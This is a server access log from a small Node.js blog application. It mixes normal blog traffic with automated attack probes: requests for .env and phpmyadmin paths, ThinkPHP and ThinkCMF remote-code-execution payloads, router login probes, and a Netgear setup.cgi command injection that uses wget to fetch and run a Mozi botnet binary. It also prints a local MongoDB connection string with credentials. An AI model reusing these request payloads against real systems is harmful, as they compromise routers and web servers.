[0mGET / [36m304 [0m10.199 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.607 ms - -[0m
[0mGET / [36m304 [0m1.438 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.526 ms - -[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m1.924 ms - 883[0m
[0mGET / [32m200 [0m1.319 ms - 451[0m
[0mGET / [32m200 [0m1.040 ms - 451[0m
[0mGET /.env [33m404 [0m1.277 ms - 883[0m
[0mPOST / [33m404 [0m18.387 ms - 883[0m
[0mGET /phpmyadmin/ [33m404 [0m1.329 ms - 883[0m
[0mGET / [32m200 [0m1.154 ms - 451[0m
[0mGET / [32m200 [0m0.754 ms - 451[0m
[0mGET / [32m200 [0m1.267 ms - 451[0m
[0mGET / [32m200 [0m0.908 ms - 451[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.224 ms - 883[0m
[0mGET /webdav/ [33m404 [0m0.974 ms - 883[0m
[0mGET / [32m200 [0m1.199 ms - 451[0m
[0mGET / [32m200 [0m1.144 ms - 451[0m
[0mGET / [32m200 [0m1.197 ms - 451[0m
[0mGET /phpmyadmin/ [33m404 [0m2.163 ms - 883[0m
[0mGET / [32m200 [0m0.903 ms - 451[0m
[0mGET / [32m200 [0m1.033 ms - 451[0m
[0mGET / [32m200 [0m1.190 ms - 451[0m
[0mGET /phpmyadmin/ [33m404 [0m1.376 ms - 883[0m
[0mGET /.env [33m404 [0m0.855 ms - 883[0m
[0mPOST / [33m404 [0m1.393 ms - 883[0m
[0mGET / [32m200 [0m0.869 ms - 451[0m
[0mGET / [32m200 [0m1.024 ms - 451[0m
[0mGET / [32m200 [0m0.741 ms - 451[0m
[0mGET / [32m200 [0m0.816 ms - 451[0m
[0mGET / [32m200 [0m1.131 ms - 451[0m
[0mGET / [32m200 [0m1.090 ms - 451[0m
[0mGET / [32m200 [0m0.870 ms - 451[0m
[0mGET / [32m200 [0m1.154 ms - 451[0m
[0mGET / [32m200 [0m0.796 ms - 451[0m
[0mGET /.env [33m404 [0m0.788 ms - 883[0m
[0mPOST / [33m404 [0m0.833 ms - 883[0m
[0mHEAD /robots.txt [33m404 [0m1.756 ms - 883[0m
[0mGET / [32m200 [0m0.832 ms - 451[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.938 ms - 883[0m
[0mGET / [32m200 [0m1.088 ms - 451[0m
[0mGET /.env [33m404 [0m0.872 ms - 883[0m
[0mGET /admin/.env [33m404 [0m1.039 ms - 883[0m
[0mGET /laravel/.env [33m404 [0m0.939 ms - 883[0m
[0mGET /public/.env [33m404 [0m0.955 ms - 883[0m
[0mGET /v1/.env [33m404 [0m0.899 ms - 883[0m
[0mGET /app/.env [33m404 [0m0.957 ms - 883[0m
[0mGET /config/.env [33m404 [0m1.003 ms - 883[0m
[0mGET /core/.env [33m404 [0m0.812 ms - 883[0m
[0mGET /apps/.env [33m404 [0m0.743 ms - 883[0m
[0mGET /lib/.env [33m404 [0m0.833 ms - 883[0m
[0mGET /cron/.env [33m404 [0m0.845 ms - 883[0m
[0mGET /database/.env [33m404 [0m0.966 ms - 883[0m
[0mGET /uploads/.env [33m404 [0m0.909 ms - 883[0m
[0mGET /site/.env [33m404 [0m2.074 ms - 883[0m
[0mGET /web/.env [33m404 [0m1.055 ms - 883[0m
[0mGET /administrator/.env [33m404 [0m0.956 ms - 883[0m
[0mGET / [32m200 [0m0.903 ms - 451[0m
[0mGET / [32m200 [0m0.825 ms - 451[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.964 ms - 883[0m
[0mGET /.env [33m404 [0m0.754 ms - 883[0m
[0mPOST / [33m404 [0m0.881 ms - 883[0m
[0mGET / [32m200 [0m1.173 ms - 451[0m
[0mGET / [36m304 [0m1.699 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.541 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.940 ms - 883[0m
[0mGET / [36m304 [0m1.311 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.491 ms - -[0m
[0mGET / [32m200 [0m1.386 ms - 455[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
(node:27177) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:27177) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:blogs@localhost/blogs
(node:957) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:957) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:blogs@localhost/blogs
[0mGET / [36m304 [0m4.917 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.958 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.751 ms - -[0m
[0mGET /blogApp.js [36m304 [0m0.651 ms - -[0m
[0mGET /favicon.ico [36m304 [0m1.225 ms - -[0m
[0mGET / [36m304 [0m0.645 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.624 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.504 ms - -[0m
[0mGET /blogApp.js [36m304 [0m0.469 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.753 ms - -[0m
[0mGET / [36m304 [0m0.805 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.557 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.524 ms - -[0m
[0mGET /blogApp.js [36m304 [0m1.418 ms - -[0m
[0mGET /favicon.ico [32m200 [0m2.541 ms - 2978[0m
[0mGET /api/blog [36m304 [0m18.645 ms - -[0m
[0mGET /icons/open-iconic-master/svg/pencil.svg [36m304 [0m9.552 ms - -[0m
[0mGET /icons/open-iconic-master/svg/trash.svg [36m304 [0m9.508 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.608 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.644 ms - -[0m
[0mGET / [32m200 [0m0.919 ms - 2978[0m
[0mGET / [32m200 [0m0.948 ms - 2978[0m
[0mGET /lib/angular-route.min.js [32m200 [0m0.684 ms - 5721[0m
[0mGET /lib/angular.min.js [32m200 [0m1.836 ms - 176531[0m
[0mGET /blogApp.js [32m200 [0m0.615 ms - 5330[0m
[0mGET /api/blog [32m200 [0m4.224 ms - 245[0m
[0mGET /icons/open-iconic-master/svg/pencil.svg [32m200 [0m1.382 ms - 147[0m
[0mGET /icons/open-iconic-master/svg/trash.svg [32m200 [0m1.537 ms - 334[0m
[0mPOST /api/blog/ [32m200 [0m19.908 ms - 146[0m
[0mGET /listBlog [32m200 [0m0.801 ms - 2978[0m
[0mGET /lib/angular.min.js [36m304 [0m1.589 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.452 ms - -[0m
[0mGET /blogApp.js [36m304 [0m0.441 ms - -[0m
[0mGET /icons/open-iconic-master/svg/pencil.svg [36m304 [0m1.111 ms - -[0m
[0mGET /icons/open-iconic-master/svg/trash.svg [36m304 [0m0.830 ms - -[0m
[0mGET /api/blog [32m200 [0m3.712 ms - 384[0m
[0mGET /api/blog/5f97969094b38b03bdd21047 [32m200 [0m4.968 ms - 146[0m
[0mGET /api/blog/5f97969094b38b03bdd21047 [36m304 [0m2.124 ms - -[0m
[0mPUT /api/blog/5f97969094b38b03bdd21047 [32m200 [0m5.975 ms - 148[0m
[0mGET /listBlog [36m304 [0m0.590 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.431 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.578 ms - -[0m
[0mGET /blogApp.js [36m304 [0m0.440 ms - -[0m
[0mGET /api/blog [32m200 [0m2.539 ms - 386[0m
[0mGET /icons/open-iconic-master/svg/trash.svg [36m304 [0m0.643 ms - -[0m
[0mGET /icons/open-iconic-master/svg/pencil.svg [36m304 [0m0.694 ms - -[0m
[0mGET /api/blog/5f97969094b38b03bdd21047 [32m200 [0m3.398 ms - 148[0m
[0mGET /api/blog/5f97969094b38b03bdd21047 [36m304 [0m3.985 ms - -[0m
(node:957) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
[0mDELETE /api/blog/5f97969094b38b03bdd21047 [32m204 [0m4.670 ms - -[0m
[0mGET /listBlog [36m304 [0m0.683 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.490 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.478 ms - -[0m
[0mGET /blogApp.js [36m304 [0m0.461 ms - -[0m
[0mGET /icons/open-iconic-master/svg/pencil.svg [36m304 [0m0.370 ms - -[0m
[0mGET /icons/open-iconic-master/svg/trash.svg [36m304 [0m0.527 ms - -[0m
[0mGET /api/blog [32m200 [0m3.579 ms - 245[0m
[0mGET /TP/public/index.php [32m200 [0m0.905 ms - 2978[0m
[0mGET /TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 [32m200 [0m0.886 ms - 2978[0m
[0mPOST /TP/public/index.php?s=captcha [32m200 [0m1.502 ms - 2978[0m
[0mGET / [32m200 [0m0.817 ms - 2978[0m
[0mGET / [32m200 [0m0.889 ms - 2978[0m
[0mGET / [32m200 [0m1.825 ms - 2978[0m
[0mPOST /boaform/admin/formLogin [32m200 [0m0.990 ms - 2978[0m
[0mGET / [32m200 [0m0.794 ms - 2978[0m
[0mGET / [32m200 [0m0.819 ms - 2978[0m
[0mGET / [32m200 [0m0.674 ms - 2978[0m
[0mGET / [32m200 [0m0.921 ms - 2978[0m
[0mGET / [32m200 [0m1.629 ms - 2978[0m
[0mGET /0bef [32m200 [0m1.748 ms - 2978[0m
[0mGET /.env [32m200 [0m1.156 ms - 2978[0m
[0mPOST / [32m200 [0m0.969 ms - 2978[0m
[0mPOST /boaform/admin/formLogin [32m200 [0m0.816 ms - 2978[0m
[0mGET / [32m200 [0m1.064 ms - 2978[0m
[0mGET / [32m200 [0m0.723 ms - 2978[0m
[0mGET / [32m200 [0m0.867 ms - 2978[0m
[0mGET /ReportServer [32m200 [0m0.932 ms - 2978[0m
[0mGET / [32m200 [0m0.728 ms - 2978[0m
[0mGET / [32m200 [0m0.943 ms - 2978[0m
[0mGET / [32m200 [0m0.719 ms - 2978[0m
[0mGET / [32m200 [0m1.245 ms - 2978[0m
[0mGET / [32m200 [0m0.687 ms - 2978[0m
[0mGET /portal/redlion [32m200 [0m0.997 ms - 2978[0m
[0mGET /.env [32m200 [0m0.798 ms - 2978[0m
[0mPOST / [32m200 [0m0.845 ms - 2978[0m
[0mGET / [32m200 [0m0.721 ms - 2978[0m
[0mGET / [32m200 [0m0.664 ms - 2978[0m
[0mGET / [32m200 [0m0.948 ms - 2978[0m
[0mGET / [32m200 [0m0.711 ms - 2978[0m
[0mGET / [32m200 [0m0.967 ms - 2978[0m
[0mGET / [32m200 [0m1.017 ms - 2978[0m
[0mGET / [32m200 [0m0.908 ms - 2978[0m
[0mGET / [32m200 [0m0.704 ms - 2978[0m
[0mPOST /boaform/admin/formLogin [32m200 [0m1.112 ms - 2978[0m
[0mGET / [32m200 [0m0.691 ms - 2978[0m
[0mGET / [32m200 [0m0.700 ms - 2978[0m
[0mGET / [32m200 [0m0.713 ms - 2978[0m
[0mGET /wp-content/plugins/wp-file-manager/readme.txt [32m200 [0m0.807 ms - 2978[0m
[0mGET /solr/admin/info/system?wt=json [32m200 [0m0.784 ms - 2978[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.926 ms - 2978[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.940 ms - 2978[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [32m200 [0m1.063 ms - 2978[0m
